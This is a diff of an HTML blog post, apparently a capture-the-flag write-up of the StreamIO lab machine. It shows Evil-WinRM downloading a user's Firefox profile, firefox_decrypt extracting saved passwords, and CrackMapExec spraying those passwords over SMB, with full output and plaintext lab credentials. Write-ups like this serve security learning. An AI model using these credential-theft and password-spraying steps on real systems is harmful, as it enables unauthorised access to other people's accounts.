@@ -484,6 +484,91 @@ We have access to the web server scripts in <code>C:\inetpub\</code> where we co
 
 <span class="nv">$connection</span> <span class="p">=</span> <span class="n">array</span><span class="p">(</span><span class="s2">&quot;Database&quot;</span><span class="p">=&gt;</span><span class="s2">&quot;STREAMIO&quot;</span><span class="p">,</span> <span class="s2">&quot;UID&quot;</span> <span class="p">=&gt;</span> <span class="s2">&quot;db_admin&quot;</span><span class="p">,</span> <span class="s2">&quot;PWD&quot;</span> <span class="p">=&gt;</span> <span class="s1">&#39;B1@hx31234567890&#39;</span><span class="p">);</span>
 </code></pre></div>
+
+<p>But there is nothing we can do with those credentials, we already know what's inside the database. </p>
+<p>Sooo keep on digging on the box itself using the winrm shell. After a while I found some Firefox data inside <code>C:\Users\nikk37\Appdata\Roaming\Mozilla\Firefox</code>
+The very great Evil-WinRM can download the whole folder for us.</p>
+<div class="highlight"><pre><span></span><code><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">nikk37</span><span class="p">\</span><span class="n">Appdata</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Mozilla</span><span class="p">&gt;</span> <span class="n">download</span> <span class="s2">&quot;C:/Users/nikk37/Appdata/Roaming/Mozilla/Firefox/&quot;</span>
+<span class="n">Info</span><span class="p">:</span> <span class="n">Downloading</span> <span class="n">C</span><span class="p">:/</span><span class="n">Users</span><span class="p">/</span><span class="n">nikk37</span><span class="p">/</span><span class="n">Appdata</span><span class="p">/</span><span class="n">Roaming</span><span class="p">/</span><span class="n">Mozilla</span><span class="p">/</span><span class="n">Firefox</span><span class="p">/</span> <span class="n">to</span> <span class="p">./</span><span class="n">Firefox</span>
+
+
+<span class="n">Info</span><span class="p">:</span> <span class="n">Download</span> <span class="n">successful</span><span class="p">!</span>
+</code></pre></div>
+
+<p>After a short while we have a copy of the Firefox folder on our local system. Now we can use some other tools, to look if passwords are saved in Firefox.
+<a href="https://github.com/Unode/firefox_decrypt">firefox_decrypt</a> worked very well, but sadly only with Python 3.9+. Ubuntu 20.04 ships with Python 3.8.
+Nevertheless</p>
+<div class="highlight"><pre><span></span><code>python firefox_decrypt.py Firefox/
+Select the Mozilla profile you wish to decrypt
+<span class="m">1</span> -&gt; Profiles/5rwivk2l.default
+<span class="m">2</span> -&gt; Profiles/br53rxeg.default-release
+<span class="m">2</span>
+
+Website:   https://slack.streamio.htb
+Username: <span class="s1">&#39;admin&#39;</span>
+Password: <span class="s1">&#39;JDg0dd1s@d0p3cr3@t0r&#39;</span>
+
+Website:   https://slack.streamio.htb
+Username: <span class="s1">&#39;nikk37&#39;</span>
+Password: <span class="s1">&#39;n1kk1sd0p3t00:)&#39;</span>
+
+Website:   https://slack.streamio.htb
+Username: <span class="s1">&#39;yoshihide&#39;</span>
+Password: <span class="s1">&#39;paddpadd@12&#39;</span>
+
+Website:   https://slack.streamio.htb
+Username: <span class="s1">&#39;JDgodd&#39;</span>
+Password: <span class="s1">&#39;password@12&#39;</span>
+</code></pre></div>
+
+<p>And again some passwords, that we test on SMB. I put the usernames in a text file and also the passwords, to cross check all passwords.</p>
+<div class="highlight"><pre><span></span><code>cat users.txt
+JDgodd
+Administrator
+yoshihide
+Martin
+</code></pre></div>
+
+<p>I left out nikk37 because we already have access to this account.</p>
+<div class="highlight"><pre><span></span><code>cat passwords.txt
+JDg0dd1s@d0p3cr3@t0r
+n1kk1sd0p3t00:<span class="o">)</span>
+paddpadd@12
+password@12
+get_dem_girls2@yahoo.com
+66boysandgirls..
+</code></pre></div>
+
+<p>CrackMapExec does all the work for us.</p>
+<div class="highlight"><pre><span></span><code>cme smb <span class="nv">$TIP</span> -u users.txt -p passwords.txt  --continue-on-success
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span>.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:streamIO.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:JDg0dd1s@d0p3cr3@t0r
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:n1kk1sd0p3t00:<span class="o">)</span> STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:paddpadd@12 STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:password@12 STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:get_dem_girls2@yahoo.com STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:66boysandgirls.. STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\A</span>dministrator:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\A</span>dministrator:n1kk1sd0p3t00:<span class="o">)</span> STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\A</span>dministrator:paddpadd@12 STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\A</span>dministrator:password@12 STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\A</span>dministrator:get_dem_girls2@yahoo.com STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\A</span>dministrator:66boysandgirls.. STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\y</span>oshihide:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\y</span>oshihide:n1kk1sd0p3t00:<span class="o">)</span> STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\y</span>oshihide:paddpadd@12 STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\y</span>oshihide:password@12 STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\y</span>oshihide:get_dem_girls2@yahoo.com STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\y</span>oshihide:66boysandgirls.. STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\M</span>artin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\M</span>artin:n1kk1sd0p3t00:<span class="o">)</span> STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\M</span>artin:paddpadd@12 STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\M</span>artin:password@12 STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\M</span>artin:get_dem_girls2@yahoo.com STATUS_LOGON_FAILURE
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\M</span>artin:66boysandgirls.. STATUS_LOGON_FAILURE
+</code></pre></div>
+
+<p>And we are lucky. <strong>JDgodd</strong> has the password <strong>JDg0dd1s@d0p3cr3@t0r</strong>.</p>
   </div>
   <div class="tag-cloud">
     <p>
